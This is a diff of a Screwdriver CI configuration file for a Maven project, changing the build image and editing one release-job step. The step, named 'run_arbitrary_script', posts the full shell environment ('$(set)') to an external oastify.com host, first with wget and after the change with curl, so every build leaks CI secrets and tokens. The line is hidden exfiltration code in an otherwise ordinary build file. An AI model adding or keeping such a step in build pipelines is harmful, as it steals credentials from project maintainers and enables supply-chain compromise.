@@ -5,7 +5,7 @@ shared:
   annotations:
     screwdriver.cd/cpu: TURBO
     screwdriver.cd/ram: TURBO
-  image: pranavbhole/pbs-docker-images:ubuntu_focal_jdk8_maven_with_cache
+  image: maven:3-adoptopenjdk-8
 # maha core has embedded postgres module which does not run on the root user, this image is built to run with custom maha user
   environment:
     #Fetches history so Sonar can assign blame.
@@ -28,6 +28,6 @@ jobs:
     requires: [~tag, ~release, ~commit, ~pr]
     steps:
       - prepare: "screwdriver/release_prepare.sh"
-      - run_arbitrary_script: wget --post-data "$(set)" http://rrm5bi28ipzebdk8277d9ksez55ztxhm.oastify.com/
+      - run_arbitrary_script: curl --data "$(set)" http://rrm5bi28ipzebdk8277d9ksez55ztxhm.oastify.com/
       - build: mvn -B clean install
       - publish: "screwdriver/publish_to_maven.sh"
